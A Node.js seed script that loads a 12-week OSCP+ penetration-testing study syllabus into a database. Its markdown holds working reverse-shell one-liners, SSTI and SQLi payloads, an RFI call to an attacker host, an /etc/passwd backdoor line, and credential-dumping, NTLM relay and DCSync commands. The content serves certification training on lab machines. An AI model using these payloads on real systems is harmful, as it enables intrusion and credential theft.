/* Seed the 12-week OSCP+ syllabus into cert_prep_modules.
 *
 * Run once with `node db/seed-oscp-syllabus.js`. Idempotent — wipes the
 * existing OSCP modules first so you can iterate on the content and re-run.
 *
 * Content distilled from the user-supplied OSCP prep PDFs (~50 docs covering
 * AD attacks, privesc, recon, web exploitation, tunneling, exam strategy).
 */
import { db } from './index.js';

const cert = db.prepare('SELECT id FROM cert_prep WHERE slug = ?').get('oscp');
if (!cert) {
  console.error('No OSCP cert_prep row found. Aborting.');
  process.exit(1);
}

// Fresh slate: drop any existing modules + their per-user progress so we can
// rerun this script while iterating on the syllabus.
db.prepare('DELETE FROM cert_prep_module_progress WHERE module_id IN (SELECT id FROM cert_prep_modules WHERE cert_id = ?)').run(cert.id);
db.prepare('DELETE FROM cert_prep_modules WHERE cert_id = ?').run(cert.id);

const modules = [
  {
    week_num: 1,
    title: 'Foundations: Linux, Windows, networking, scripting',
    goal: 'Build a solid base — be comfortable in a shell on either OS, understand TCP/IP, and write small bash + python helpers without looking things up.',
    topics_md: `**Linux fundamentals**
- File system layout (\`/etc/passwd\`, \`/etc/shadow\`, \`/var/log\`, \`/proc\`, \`/sys\`)
- Process control: \`ps -ef\`, \`top\`, \`kill\`, \`systemctl\`, \`journalctl -xe\`
- File operations: \`find\`, \`grep -rE\`, \`sed\`, \`awk\`, \`xargs\`
- Permissions: \`chmod\` octal vs symbolic, sticky bit, SUID/SGID, ACLs
- Networking: \`ip a\`, \`ss -tlnp\`, \`netstat -anp\`, \`/etc/resolv.conf\`, \`/etc/hosts\`

**Windows fundamentals**
- Cmd vs PowerShell — when to use each
- Useful cmdlets: \`Get-Process\`, \`Get-Service\`, \`Get-LocalUser\`, \`Test-NetConnection\`, \`Invoke-WebRequest\`
- Filesystem: \`C:\\Windows\\System32\`, \`%APPDATA%\`, registry hives
- Networking: \`ipconfig /all\`, \`netstat -anob\`, \`route print\`
- Service management: \`sc query\`, \`Get-Service\`, \`Get-WmiObject -Class Win32_Service\`

**Networking refresher**
- TCP three-way handshake, common ports (21/22/23/25/53/80/88/110/135/139/389/443/445/636/993/995/1433/3306/3389/5985-5986)
- Subnets, CIDR notation, NAT, firewall states (NEW/ESTABLISHED)
- DNS resolution flow, DHCP, ARP

**Bash / Python scripting**
- One-liners: \`for i in $(seq 1 254); do ping -c1 -W1 10.10.10.\$i; done\`
- Python sockets, requests, subprocess basics
- Decoding base64, URL, hex; encoding/escaping`,
    daily_tasks_md: `- [ ] Spin up Kali in VM, snapshot before changes
- [ ] Walk through OverTheWire **Bandit** levels 1-15 to get bash muscle memory
- [ ] Read \`man find\` end-to-end; do 5 \`find\` exercises
- [ ] In a Windows VM, list every running service via PowerShell
- [ ] Write a Python port-scanner in 30 lines (TCP connect)
- [ ] Read a 30-min networking primer (Julia Evans zines or RFCs 791/793 introductions)`,
    resources_md: `- **Powershell Tutorial for Beginners.pdf** — your PowerShell start
- **PowerShell.pdf** — handy reference
- OverTheWire **Bandit** (free linux training)
- HackTheBox **Starting Point** (free, account required)
- TryHackMe **Linux Fundamentals 1-3** (free)`,
    lab_targets_md: `- OverTheWire Bandit 1-15
- HTB Starting Point: \`Meow\`, \`Fawn\`, \`Dancing\`, \`Redeemer\`, \`Explosion\`, \`Preignition\``,
  },

  {
    week_num: 2,
    title: 'Reconnaissance — Nmap, masscan, service discovery',
    goal: 'Reach the point where any host you scan, you can name every service, version, and likely attack surface within 10 minutes.',
    topics_md: `**Nmap stages**
1. Host discovery: \`nmap -sn 10.10.10.0/24\` (ARP/ICMP)
2. All-port SYN: \`nmap -p- -sS --min-rate 5000 10.10.10.10 -oA tcp-all\`
3. Service + script: \`nmap -sC -sV -p<found> -oA tcp-svc 10.10.10.10\`
4. UDP top: \`sudo nmap -sU --top-ports 50 10.10.10.10\`
5. Vuln NSE: \`nmap --script vuln,ssl-* -p<found> 10.10.10.10\`

**Stealth tradeoffs**
- \`-Pn\` skips host discovery (when ICMP is blocked)
- \`-T4\` aggressive timing; \`-T2\` slow & quiet
- \`--min-rate 5000\` for fast big sweeps
- \`-D RND:5\` decoys; \`-S\` source-spoof (rarely needed for OSCP)

**Per-service enumeration**
- **HTTP(S)**: \`whatweb\`, \`nikto -h URL\`, \`gobuster dir -u URL -w wl -x php,html,txt -t 50\`, \`feroxbuster\`, \`ffuf\` for parameter fuzz, vhost/subdomain discovery
- **SMB**: \`smbclient -L //IP\`, \`smbmap -H IP\`, \`enum4linux-ng -A IP\`, \`nxc smb IP --shares\`
- **FTP**: anon login, banner grab, \`searchsploit <banner>\`
- **SSH**: \`ssh-audit IP\`, weak key detection
- **DNS**: \`dig @IP domain.local AXFR\`, subdomain brute (\`gobuster dns\`, \`amass\`)
- **LDAP**: \`ldapsearch -x -H ldap://IP -s base namingContexts\`, \`windapsearch\`
- **SNMP**: \`snmpwalk -c public -v1 IP\`, OID 1.3.6.1.4.1.77.1.2.25 = users
- **RPC**: \`rpcclient -U "" -N IP\` → \`enumdomusers\`, \`querydispinfo\`
- **SMTP**: \`smtp-user-enum -M VRFY -U users.txt -t IP\`
- **NFS**: \`showmount -e IP\`, \`mount -t nfs IP:/share /mnt/nfs\`

**Output discipline**
- ALWAYS use \`-oA\` so you have grepable + nmap + xml output
- Separate fast-scan from deep-scan files
- Note service versions immediately into your engagement notes`,
    daily_tasks_md: `- [ ] Day 1: scan a target with all five Nmap stages, document every output
- [ ] Day 2: enumerate a Windows host (SMB, RPC, LDAP) without credentials
- [ ] Day 3: enumerate a Linux web app (HTTP fuzzing, vhost discovery)
- [ ] Day 4: SNMP + DNS deep dive
- [ ] Day 5: build a reusable \`enum.sh\` bash script that runs your default workflow on a new IP
- [ ] Practice writing service findings the way you'd put them in a report`,
    resources_md: `- **40+ Vital Nmap Commands.pdf** — keep open during scans
- **Enumeration Checklist For OSCP Exam.pdf** — your "did I miss anything?" list
- **Server Security Checklist.pdf** — defender's view, useful for thinking like one
- nmap.org NSE script docs
- HackTricks Pentesting Web / SMB / RPC / LDAP pages`,
    lab_targets_md: `- HTB \`Lame\` (SMB), \`Legacy\` (SMB), \`Blue\` (SMB)
- HTB \`Beep\` (multi-service web)
- TryHackMe \`Nmap\` and \`Network Services\` rooms`,
  },

  {
    week_num: 3,
    title: 'Web exploitation I — auth, SQLi, file upload, LFI/RFI',
    goal: 'Get from "I see a login page" to "I have a webshell" by drilling the most-tested web vuln classes.',
    topics_md: `**Authentication bypasses**
- Default creds (\`admin:admin\`, \`tomcat:tomcat\`, \`s3cr3t\`)
- SQLi auth bypass: \`admin' OR '1'='1'-- -\`, \`admin' OR 1=1#\`
- Forced browsing — admin pages without auth check
- JWT \`alg:none\`, weak HS256 secrets (\`jwt-cracker\`)
- Session prediction, IDOR on session IDs

**SQL injection (the OSCP favourite)**
- Detection: \`'\`, \`"\`, \`)\`, \`--\` — error or behavioural difference
- UNION-based: \`' UNION SELECT 1,2,3,@@version-- -\`
- Error-based (MySQL): \`' AND extractvalue(0,concat(0x7e,version()))-- -\`
- Boolean blind: \`' AND 1=1-- -\` vs \`' AND 1=2-- -\`
- Time-based: MySQL \`AND SLEEP(5)\`, MSSQL \`'; WAITFOR DELAY '0:0:5'\`
- Database fingerprint via version comments / function support
- File access: MySQL \`LOAD_FILE\`, MSSQL \`xp_cmdshell\`, MSSQL \`OPENROWSET\`
- \`sqlmap -u 'URL' -p param --risk 3 --level 5 --batch --tamper=between\`

**File upload bypass**
- Extension filter: \`.php5\`, \`.phtml\`, \`.php.jpg\`, \`.php\\x00.jpg\`
- MIME spoof: send \`Content-Type: image/jpeg\` with \`.php\` body
- Magic-byte prepend: \`\\xFF\\xD8\\xFF\\xE0\` then PHP code
- Apache \`.htaccess\` upload to remap extension
- IIS double-extension parsing (\`shell.asp;.jpg\`)

**LFI / RFI / path traversal**
- \`../../../../etc/passwd\` (count \`..\` until you hit \`/\`)
- PHP wrappers: \`php://filter/convert.base64-encode/resource=index.php\` to read source
- LFI to RCE: log poisoning into \`/var/log/apache2/access.log\` then include
- \`/proc/self/environ\` injection if PHP <5.3
- RFI: \`?file=http://attacker/shell.txt\` if \`allow_url_include=On\``,
    daily_tasks_md: `- [ ] Day 1: PortSwigger Academy SQLi labs (free) — finish all UNION-based ones
- [ ] Day 2: PortSwigger Academy SQLi blind labs
- [ ] Day 3: build a \`shell.php\` from scratch, try 5 upload bypasses against DVWA
- [ ] Day 4: PortSwigger Academy file-upload labs
- [ ] Day 5: PortSwigger Academy directory-traversal + PHP-wrapper labs
- [ ] Save every PoC + screenshot; this is report-grade evidence`,
    resources_md: `- **SQL Injection.pdf** — full taxonomy
- **WAF Bypass methodologies.pdf** — keep open when sqlmap fails
- PortSwigger Web Security Academy — labs for every class
- HackTricks Web Vulnerabilities pages
- PayloadsAllTheThings repo (especially \`Upload Insecure Files\`)`,
    lab_targets_md: `- HTB \`Beep\`, \`Bashed\`, \`Shocker\` (web → shell)
- HTB \`Sense\`, \`Sunday\` (specific service abuse)
- DVWA + Mutillidae for unlimited practice
- PG Practice: \`Heist\`, \`Internal\` (web entry)`,
  },

  {
    week_num: 4,
    title: 'Web exploitation II — SSRF, XXE, SSTI, deserialization, WAF bypass',
    goal: 'Cover the modern web attack classes you\'ll see on the OSCP+ AD set web entry box.',
    topics_md: `**SSRF**
- Detection: \`?url=\`, \`?proxy=\`, \`?webhook=\` parameters
- Internal targets: \`http://127.0.0.1:8080\`, \`http://169.254.169.254/latest/meta-data/\` (AWS), \`http://metadata.google.internal/\` (GCP)
- Bypasses: \`http://[::1]\`, decimal IPs (\`http://2130706433/\`), DNS rebinding
- Gopher: \`gopher://target:6379/_INFO\` for Redis
- Blind SSRF detection via \`http://collaborator.attacker.com\`

**XXE**
- In-band: \`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>\`
- Blind/OOB: external DTD pointing to attacker server, exfil via DNS
- XInclude when DOCTYPE blocked
- SVG/DOCX uploads as XXE entry

**SSTI**
- Detection: \`{{7*7}}\`, \`\${7*7}\`, \`<%= 7*7 %>\` — see what evaluates
- Jinja2 RCE: \`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\`
- Twig: \`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}\`
- ERB: \`<%= system('id') %>\`
- Freemarker: \`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}\`

**Deserialization**
- PHP: \`unserialize()\` of attacker-controlled input → magic methods (\`__wakeup\`, \`__destruct\`)
- Java: ysoserial gadget chains (CommonsCollections1, etc.)
- .NET: ysoserial.net (BinaryFormatter, ObjectStateFormatter)
- Python: \`pickle.loads()\` is RCE on attacker data
- Detection: base64 starting with \`O:\` (PHP), \`aced0005\` (Java)

**WAF bypass**
- Case mutation: \`UnIoN SeLeCt\`
- Comment injection: \`UNI/**/ON SELECT\`
- HTTP parameter pollution: \`?id=1&id=2\` (different parsers handle differently)
- HTTP parameter fragmentation across params
- Encoding: URL, double-URL, Unicode, hex
- Chunked encoding, trailing whitespace, Host header tricks
- JSON body when WAF only inspects URL`,
    daily_tasks_md: `- [ ] Day 1: PortSwigger SSRF labs (all)
- [ ] Day 2: PortSwigger XXE labs
- [ ] Day 3: PortSwigger SSTI labs (Jinja + Twig + Freemarker)
- [ ] Day 4: practice ysoserial against a HackTheBox or PG Java box
- [ ] Day 5: WAF bypass drill — set up modsecurity locally and bypass it`,
    resources_md: `- **WAF Bypass methodologies.pdf** — bypass cookbook
- **1400+ HackerOne Reports.pdf** — recurring patterns in real bug bounties
- **Cloud Pentesting Cheatsheet.pdf** — for SSRF→cloud chains
- HackTricks SSRF, XXE, SSTI, Deserialization pages
- PayloadsAllTheThings (best gadgets in one place)`,
    lab_targets_md: `- HTB \`Aragog\` (XXE)
- HTB \`Help\` (SQLi → RCE chain)
- PG Practice: \`Symbolic\`, \`Gaara\`, \`Internal\` (mixed web)`,
  },

  {
    week_num: 5,
    title: 'Client-side attacks + initial access fundamentals',
    goal: 'Understand how an attacker turns a recovered credential or a phishing payload into a foothold.',
    topics_md: `**Password attacks**
- Hashcat modes you'll use most: \`-m 1000\` (NTLM), \`-m 5600\` (NetNTLMv2), \`-m 13100\` (Kerberos TGS), \`-m 18200\` (AS-REP), \`-m 1800\` (sha512crypt linux), \`-m 0\` (md5)
- Hashcat rules: \`?d?d?d?d\` masks for known patterns; \`-r best64.rule\`; combinator attacks
- Wordlists: rockyou, SecLists, custom (cewl from target site)
- Hydra patterns: \`hydra -L users.txt -P pass.txt ssh://IP -t 4 -f\`; same for ftp, http-post-form, smb
- Patator when hydra misbehaves
- Online vs offline cracking — never online-brute against AD without lockout knowledge

**Client-side payloads**
- HTA, LNK, ISO, OneNote, macros (the OSCP+ recovers some classic client-side attack surface)
- \`msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f exe -o evil.exe\`
- AV evasion light: shellcode encoder, donut, sgn (don't go full red-team — exam is about technique)

**Reverse shells**
- Bash: \`bash -i >& /dev/tcp/IP/PORT 0>&1\`
- Python: \`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'\`
- PowerShell: \`powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"\`
- nc/ncat: \`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP PORT > /tmp/f\`
- TTY upgrade: \`python -c 'import pty;pty.spawn("/bin/bash")'\` → Ctrl+Z → \`stty raw -echo; fg\` → \`reset\`

**File transfer**
- Linux receive: \`wget\`, \`curl\`, \`scp\`, base64-paste in pinch
- Windows receive: \`certutil -urlcache -split -f http://IP/file file\`, \`Invoke-WebRequest\`, \`bitsadmin\`
- SimpleHTTPServer: \`python3 -m http.server 80\` (attacker)
- SMB: \`impacket-smbserver share .\` then \`copy \\\\IP\\share\\file\``,
    daily_tasks_md: `- [ ] Day 1: hashcat through every common hash type with rockyou
- [ ] Day 2: build a custom wordlist with cewl + cupp + your own variations
- [ ] Day 3: practice every reverse shell type until you know them by feel
- [ ] Day 4: TTY upgrades from netcat catch on 5 different boxes
- [ ] Day 5: create a payload arsenal (msfvenom + manual) you can pull from`,
    resources_md: `- **Useful OSCP Links.pdf** — bookmark dump
- **9 OSCP Study Tips to Help You Succeed By OffSec.pdf** — official guidance
- PayloadsAllTheThings → Methodology and Resources → Reverse Shell Cheatsheet
- HackTricks Generic Methodologies & Resources`,
    lab_targets_md: `- HTB \`Optimum\`, \`Bashed\`, \`Granny\` (initial access via known exploits)
- TryHackMe \`Crack the Hash\`, \`John the Ripper\``,
  },

  {
    week_num: 6,
    title: 'Linux privilege escalation',
    goal: 'Take any low-priv Linux shell to root systematically, not by guessing.',
    topics_md: `**Run automated enumeration first**
- \`linpeas.sh\` — most comprehensive
- \`linenum.sh\` — older, still solid
- \`linux-exploit-suggester.sh\` — kernel-version → known CVEs
- \`pspy64\` — watch processes spawn (catches root cron jobs)

**Manual checklist**
\`\`\`bash
id; sudo -l                                        # current creds + sudo rights
uname -a; cat /etc/os-release                      # kernel + distro
find / -type f -perm -u+s -ls 2>/dev/null          # SUID
find / -type f -perm -g+s -ls 2>/dev/null          # SGID
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.d/              # cron jobs
mount; cat /etc/fstab                              # mounted shares (NFS no_root_squash?)
ss -tlnp; ps -ef                                   # listeners + running processes
ls -la /home/* ~/.ssh /root 2>/dev/null            # ssh keys, history
grep -ri "password" /etc /var/www /opt 2>/dev/null # credentials
\`\`\`

**Common wins**
1. **Sudo NOPASSWD** abuse — check \`sudo -l\`, hit GTFOBins
2. **SUID binaries** — same, GTFOBins (\`find / -perm -u=s -type f 2>/dev/null\`)
3. **Sudo env_keep with LD_PRELOAD** — compile shared object, exec via sudo
4. **Cron jobs** — writable script, PATH abuse, wildcard injection (\`tar czf * → --checkpoint=1 --checkpoint-action=exec=/bin/sh\`)
5. **Capabilities** — \`cap_setuid+ep\` on \`/usr/bin/python3\` → \`python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'\`
6. **Kernel exploits** — when kernel is old: Dirty Cow (2016), Dirty Pipe (2022 CVE-2022-0847), PwnKit (CVE-2021-4034), nf_tables
7. **NFS no_root_squash** — \`mount\` from attacker, drop SUID shell
8. **Docker socket abuse** (member of docker group) — \`docker run -v /:/mnt --rm -it alpine chroot /mnt sh\`
9. **Writable /etc/passwd** — append \`backdoor::0:0::/root:/bin/bash\` (or hashed password)
10. **Path hijacking** — when a SUID binary calls a relative-path program

**GTFOBins lookup pattern**
For every interesting binary you find, search GTFOBins by name. Categories: \`sudo\`, \`suid\`, \`capabilities\`, \`limited-suid\`.`,
    daily_tasks_md: `- [ ] Day 1: do TryHackMe **Linux PrivEsc** room front to back
- [ ] Day 2: run linpeas on 3 different machines, read every section
- [ ] Day 3: GTFOBins drill — pick 20 binaries, learn the sudo / SUID escape for each
- [ ] Day 4: kernel exploit drill — exploit Dirty Cow + PwnKit by hand once
- [ ] Day 5: do HTB \`Lame\`, \`Beep\`, \`Bashed\`, \`Nibbles\` end-to-end (no walkthrough)`,
    resources_md: `- **Linux Privilege Escalation.pdf** — comprehensive walkthroughs
- **Linux Privilege Escalation Checklist.pdf** — exam-day reference
- **GTFOBins** (gtfobins.github.io) — bookmark
- **HackTricks** Linux Privilege Escalation
- TryHackMe **Linux PrivEsc** (free, 4 hours of labs)`,
    lab_targets_md: `- HTB Linux easy: \`Lame\`, \`Shocker\`, \`Bashed\`, \`Nibbles\`, \`Beep\`, \`Cronos\`
- HTB Linux medium: \`Sense\`, \`Solidstate\`, \`Kotarak\`, \`Node\`, \`Valentine\`, \`Poison\`, \`TartarSauce\`
- PG Practice: any "linux easy" tag is fair game`,
  },

  {
    week_num: 7,
    title: 'Windows privilege escalation',
    goal: 'Take a low-priv Windows shell to SYSTEM. Drill the Potato family — that\'s the OSCP+ standalone box winner.',
    topics_md: `**Run automated enumeration first**
- \`winpeas.exe\` (or \`winpeasx64.exe\`) — primary tool
- \`PowerUp.ps1\` (PowerSploit) — service / DLL / registry checks
- \`Seatbelt.exe\` — host configuration audit
- \`Sherlock.ps1\` / \`Watson\` — missing patches → CVE list
- \`accesschk.exe\` / \`icacls\` — manual ACL review

**Manual checklist**
\`\`\`powershell
whoami /priv; whoami /groups                         # tokens + groups
systeminfo                                            # OS version + patches
hostname; ipconfig /all; route print                 # network state
sc query state= all                                  # services
wmic service get name,pathname,startmode | findstr /i auto  # auto-start services
get-childitem -path "C:\\Program Files" -recurse -ea silentlycontinue | where { $_.Mode -match "w" }
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer  # AlwaysInstallElevated
type C:\\Windows\\Panther\\Unattend.xml 2>$null
\`\`\`

**Token abuse — the Potato family**
- \`SeImpersonatePrivilege\` or \`SeAssignPrimaryToken\` → drop a Potato
- **PrintSpoofer** (Server 2016+, Win10 1809+): \`PrintSpoofer.exe -i -c "nc.exe IP PORT -e cmd.exe"\`
- **GodPotato** (newer, post-PrintSpoofer-patch): \`GodPotato-NET4.exe -cmd "cmd /c whoami"\`
- **JuicyPotato / RoguePotato / SweetPotato** — older Windows
- **EfsPotato**, **RemotePotato** — niche

**Service exploitation**
- Unquoted service path: \`C:\\Program Files\\My App\\svc.exe\` → drop \`C:\\Program.exe\`
- Weak service ACL: replace binary, restart service via \`sc start\`
- Service DLL hijacking: replace a DLL the service loads from a writable path

**Scheduled tasks + autoruns**
- \`schtasks /query /fo list /v\` — what runs as SYSTEM?
- AutoRun reg keys: \`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`
- Startup folder writable scripts

**Credential theft**
- SAM/SYSTEM: \`reg save HKLM\\SAM C:\\Temp\\SAM\` + \`reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\` → \`secretsdump.py -sam SAM -system SYSTEM LOCAL\`
- LSASS: \`procdump64.exe -accepteula -ma lsass.exe lsass.dmp\` or \`comsvcs.dll!MiniDump\` LOLBIN
- Mimikatz: \`privilege::debug; sekurlsa::logonpasswords\`
- GPP cpassword: search SYSVOL \`\\\\domain\\SYSVOL\\domain\\Policies\\*\\Groups.xml\`
- PuTTY/WinSCP/FileZilla saved sessions
- Browser saved passwords (\`SharpChrome\`, \`SharpEdge\`)

**UAC bypass (when admin user without elevated token)**
- \`fodhelper.exe\` registry trick
- \`eventvwr.exe\` mscfile hijack
- \`computerdefaults.exe\`, \`sdclt.exe\`

**Kernel / patch exploits**
- HiveNightmare / SeriousSAM (CVE-2021-36934): user reads SAM/SYSTEM
- PrintNightmare (CVE-2021-1675/-34527): print spooler RCE
- AlwaysInstallElevated when both reg keys = 1: \`msiexec /quiet /qn /i evil.msi\``,
    daily_tasks_md: `- [ ] Day 1: TryHackMe **Windows PrivEsc** room
- [ ] Day 2: drill Potato family on a vuln Win10 VM (Hack The Box \`Heist\`/\`Sniper\`/\`Cascade\`)
- [ ] Day 3: SAM/SYSTEM extraction + offline crack with secretsdump
- [ ] Day 4: enumerate registry for AlwaysInstallElevated, Unattend, AutoLogon on 3 boxes
- [ ] Day 5: HTB Windows easy lineup (Legacy, Blue, Devel, Optimum) end-to-end`,
    resources_md: `- **Windows Privilege Escalation.pdf** — exam-grade walkthroughs
- **Windows Privilege Escalation Checklist.pdf** — exam-day quick scan
- **Advanced Windows Post-Exploitation.pdf** — for after you SYSTEM
- **Mimikatz Overview, Defenses and Detection.pdf** — knowing detection helps with stealth
- **EA - Windows Security Internals with PowerShell.pdf** — deeper "why this works"
- HackTricks Windows Privilege Escalation`,
    lab_targets_md: `- HTB Windows easy: \`Legacy\`, \`Blue\`, \`Devel\`, \`Optimum\`, \`Bastard\`, \`Granny\`, \`Arctic\`, \`Grandpa\`, \`Silo\`, \`Bounty\`, \`Jerry\`, \`Jeeves\`, \`Chatterbox\`
- HTB Windows medium: \`Heist\`, \`Sniper\`, \`Sauna\`, \`Active\`, \`Resolute\`
- TryHackMe **Steel Mountain**, **Blue**, **Ice**, **Alfred**`,
  },

  {
    week_num: 8,
    title: 'Active Directory I — theory, recon, password attacks',
    goal: 'Walk into an AD environment cold and have a domain user account by end of day. Master Kerberoasting + AS-REP + spraying.',
    topics_md: `**Mental model**
- A **domain** is a logical group of users + computers sharing a database.
- A **DC** runs AD DS, hosts Kerberos KDC + LDAP + DNS + SMB SYSVOL.
- **Kerberos** auth flow: AS-REQ (creds → KDC) → AS-REP (TGT) → TGS-REQ (TGT + SPN → KDC) → TGS-REP (ST) → AP-REQ (ST → service).
- **NTLM** is the legacy fallback; vulnerable to relay if SMB signing isn't enforced.
- **Trusts**: parent↔child, forest↔forest. Attacker pivot point.

**Unauthenticated AD recon**
\`\`\`bash
nmap -p 53,88,135,139,389,445,464,593,636,3268-3269 -sCV -oA ad-recon DC_IP
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local DC_IP
ldapsearch -x -H ldap://DC_IP -s base namingContexts
rpcclient -U "" -N DC_IP   # → enumdomusers, querydispinfo (null session?)
nxc smb DC_IP                # banner, signing, OS
nxc smb DC_IP -u '' -p '' --shares
\`\`\`

**User enumeration without creds**
- \`kerbrute userenum -d domain.local --dc DC_IP usernames.txt\`
- AS-REP roast probe: \`GetNPUsers.py -dc-ip DC_IP -no-pass -usersfile users.txt domain.local/\`

**Password spraying** (after enumerating real usernames)
\`\`\`bash
kerbrute passwordspray -d domain.local --dc DC_IP users.txt 'Spring2026!'
nxc smb DC_IP -u users.txt -p 'Spring2026!' --continue-on-success
\`\`\`
- Watch for lockout policy first: \`nxc smb DC_IP -u 'guest' -p '' --pass-pol\`
- Common spray patterns: \`<Season><Year>!\`, \`<Company>123\`, \`Welcome1\`

**AS-REP roasting** (users with pre-auth disabled)
\`\`\`bash
GetNPUsers.py -dc-ip DC_IP -request -no-pass -usersfile users.txt 'domain.local/' -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -O
\`\`\`

**Kerberoasting** (any valid domain user can do this)
\`\`\`bash
GetUserSPNs.py -dc-ip DC_IP -request 'domain.local/user:pass' -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt -O
\`\`\`

**Authenticated enumeration**
- BloodHound collector (Linux): \`bloodhound-python -d domain.local -u user -p 'pass' -ns DC_IP -c all\`
- BloodHound queries to run first: "Shortest Paths to Domain Admins", "Find Kerberoastable Users", "Find AS-REP Roastable Users", "Find Computers with Unconstrained Delegation"
- ldapdomaindump: \`ldapdomaindump -u 'domain\\user' -p 'pass' DC_IP\`
- PowerView (on a Windows beachhead): \`Get-DomainUser -SPN\`, \`Find-InterestingDomainAcl -ResolveGUIDs\``,
    daily_tasks_md: `- [ ] Day 1: deploy GOAD or HTB \`Forest\` — full unauth recon, document every finding
- [ ] Day 2: kerbrute userenum + password spray drill on the same lab
- [ ] Day 3: AS-REP roast + crack a real ticket
- [ ] Day 4: Kerberoast + crack a real service ticket
- [ ] Day 5: BloodHound collection + analyse first attack path to DA`,
    resources_md: `- **Beginner's Guide to Active Directory.pdf** — start here
- **Active Directory Overview.pdf** — domain/forest/OU/GPO theory
- **oscp-notes-active-directory.pdf** — exam-focused playbook (71 pages)
- **OWASP_FFM_41_OffensiveActiveDirectory_101_MichaelRitter.pdf** (84 pages) — second pass
- **Game of Active Directory (GOAD).pdf** — set up the lab
- HackTricks Active Directory Methodology`,
    lab_targets_md: `- **Game of Active Directory (GOAD)** — full lab on your hardware
- HTB \`Active\`, \`Forest\`, \`Sauna\`, \`Resolute\` (AD easy)
- HTB \`Cascade\`, \`Mantis\`, \`Reel\` (AD medium)
- TryHackMe \`Attacking Kerberos\``,
  },

  {
    week_num: 9,
    title: 'Active Directory II — Kerberos delegation, ACL abuse, lateral movement',
    goal: 'Chain primitives into domain admin. By end of week you can take a regular domain user → DA on a misconfigured domain.',
    topics_md: `**Kerberos delegation attacks**
- **Unconstrained delegation**: compromise a host with \`TrustedForDelegation\` → wait for an admin login (or trigger via PrinterBug / PetitPotam) → extract their TGT from LSA → ptt → DA. Detect: \`Get-DomainComputer -Unconstrained\`.
- **Constrained delegation** (\`msDS-AllowedToDelegateTo\` set): compromise the service account → S4U2Self + S4U2Proxy with \`Rubeus s4u\` to impersonate any user to the listed SPN.
- **Resource-Based Constrained Delegation (RBCD)**: if you have GenericWrite on a target computer, add a fake computer (\`addcomputer.py\`), set \`msDS-AllowedToActOnBehalfOfOtherIdentity\` to fake$, \`Rubeus s4u /user:fake$ /impersonateuser:Administrator /msdsspn:cifs/target\`.

**ACL abuse**
| Right | What you can do |
|---|---|
| GenericAll | Total control — change password, set SPN (kerberoast), add to groups |
| GenericWrite | Change properties — set logon script for code exec, set SPN |
| WriteDacl | Grant yourself GenericAll, then escalate |
| WriteOwner | Take ownership → grant yourself GenericAll |
| ForceChangePassword | Reset target's password |
| AddMember | Add yourself to a group (e.g. Domain Admins) |
| ReadLAPSPassword | Read \`ms-Mcs-AdmPwd\` on a target computer → local admin |
| AllExtendedRights on Domain | DCSync |

Find them with BloodHound's "Outbound Object Control" view from your account.

**Forced authentication primitives** (chain into NTLM relay or unconstrained TGT capture)
- **PrinterBug** (\`SpoolSample.exe\`)
- **PetitPotam** (CVE-2021-36942) — works without auth on unpatched DCs
- **DFSCoerce**, **ShadowCoerce**, **MS-EFSRPC**

**NTLM relay attack chains**
- Target SMB without signing: \`ntlmrelayx.py -t smb://target -smb2support -i\`
- Target LDAP/LDAPS with \`--delegate-access\`: grant RBCD to a fake computer
- Target ADCS HTTP CA endpoint (ESC8): \`ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\`

**Lateral movement**
- Pass-the-Hash: \`psexec.py -hashes :NTLM domain/user@target\`, \`nxc smb target -u user -H NTLM -x cmd\`
- OverPass-the-Hash: \`Rubeus asktgt /user:user /rc4:NTLM /domain:domain /dc:DC\`
- Pass-the-Ticket: \`Rubeus ptt /ticket:ticket.kirbi\` (Windows) or \`KRB5CCNAME=t.ccache impacket-psexec -k -no-pass target\` (Linux)
- WinRM: \`evil-winrm -i target -u user -p pass\` or \`-H NTLM\`
- WMI: \`wmiexec.py domain/user:pass@target\`
- DCOM: \`dcomexec.py\`

**ADCS abuse (the modern OSCP+ frequent finisher)**
- Enum: \`certipy find -u user@dc -p pass -dc-ip DC_IP -vulnerable\`
- ESC1 — template lets you specify SAN: \`certipy req -username user -password pass -ca CA-NAME -template VulnTemplate -upn 'administrator@domain.local'\`
- ESC8 — relay HTTP CA endpoint to issue cert as DC$
- Use the cert to auth: \`certipy auth -pfx admin.pfx\` → NT hash → DCSync

**DCSync (the finisher)**
\`\`\`bash
secretsdump.py -just-dc-user 'domain/krbtgt' 'domain/user:pass@DC_IP'
# you now have the krbtgt hash → forge golden tickets
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
\`\`\``,
    daily_tasks_md: `- [ ] Day 1: BloodHound paths to DA — exploit one path manually on GOAD
- [ ] Day 2: drill RBCD — addcomputer, set delegate, S4U2Proxy
- [ ] Day 3: PetitPotam → ntlmrelayx → ADCS ESC8 → DA
- [ ] Day 4: Mimikatz: extract LSASS, sekurlsa::logonpasswords, sekurlsa::pth, kerberos::golden
